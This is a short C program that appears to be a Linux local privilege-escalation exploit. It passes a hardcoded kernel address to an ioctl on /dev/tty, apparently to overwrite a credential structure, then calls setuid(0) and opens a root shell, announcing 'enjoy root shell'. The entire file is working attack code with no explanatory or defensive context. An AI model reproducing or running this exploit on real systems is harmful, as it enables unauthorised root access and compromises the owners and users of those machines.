#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>

#define PARAM 0x541b
#define ADDR 0xc010e5cc

int main() {

        int fd = open("/dev/tty", O_RDWR);
        if (ioctl(fd, PARAM, ADDR) < 0){
                printf("[-] ioctl error\n");
        }

        setuid(0);

        if (getuid() == 0){
                printf("[*] success! enjoy root shell\n");
                system("/bin/sh");
        } else {
                printf("[-] exploit did not work\n");
        }
        
}